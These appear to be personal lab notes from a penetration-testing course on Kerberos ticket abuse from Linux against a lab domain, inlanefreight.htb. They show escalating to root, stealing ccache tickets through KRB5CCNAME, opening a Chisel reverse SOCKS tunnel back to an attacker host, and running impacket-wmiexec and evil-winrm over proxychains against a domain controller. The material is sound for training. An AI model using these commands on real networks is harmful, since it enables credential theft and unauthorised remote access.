## privilege escalation to root
```
sudo -l 
```
to confirm whether the user can execute any command as root
```
sudo su 
```
to change to root
```
ls -la \tmp
```
check for ccache files 
```
id julio@inlanefreight.htb
```
to check group membership

to use the ccache file, we copy the ccache file and assign the file path to the KRB5CCName env variable 
```
export KRB5CCNAME=/path/to/ccache/file
```

# Using Linux Attack Tools with Kerberos 
if we are attacking from a machine that is not a memebr of the domain, we need to proxy our traffic via a machine in the domain with a tool such as Chisel/Proxychain and edit the /etc/hosts file to hardcode IP address of the domain and the machines we want to attack 

```
cat /etc/hosts

# Host addresses
172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```

```
cat /etc/proxychains.conf

<SNIP>
[ProxyList]
socks5 127.0.0.1 1080
```

```
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel
sudo ./chisel server --reverse 

2022/10/10 07:26:15 server: Reverse tunneling enabled
2022/10/10 07:26:15 server: Fingerprint 58EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
2022/10/10 07:26:15 server: Listening on http://0.0.0.0:8080
```

on the machine in the domain 
```
c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```
transfer ccache file from another machine we want to go into amd create the environment variable with the value corresponding to the path of the ccache file
```
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```


# Logging in as impersonated user 
```
proxychains impacket-wmiexec dc01 -k -no-pass
```

# Evil-WinRM with Kerberos
## using krb5-user
need to modify default realm (domain name) and kdc and administrative servers in /etc/krb5.conf

```
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```